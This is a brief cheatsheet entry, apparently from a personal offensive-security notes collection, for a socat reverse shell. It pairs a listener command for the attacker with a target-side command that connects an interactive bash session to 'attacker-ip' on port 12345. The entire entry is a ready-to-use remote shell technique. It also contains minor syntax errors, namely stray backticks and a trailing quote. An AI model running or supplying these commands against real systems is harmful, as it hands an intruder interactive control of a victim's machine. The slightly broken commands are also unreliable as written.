---
id: 347c974b-c017-4581-98e6-a5987e301f60
name: reverse_shell
type: cheatsheet
verified: false
created_at: '2020-07-14T18:14:36.957835+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# reverse_shell

**Command** ([[attacker]]):

```bash
` socat file:`tty`,raw,echo=0 tcp-listen:12345 `

```

**Command** ([[target:]]):

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker-ip:12345"

```
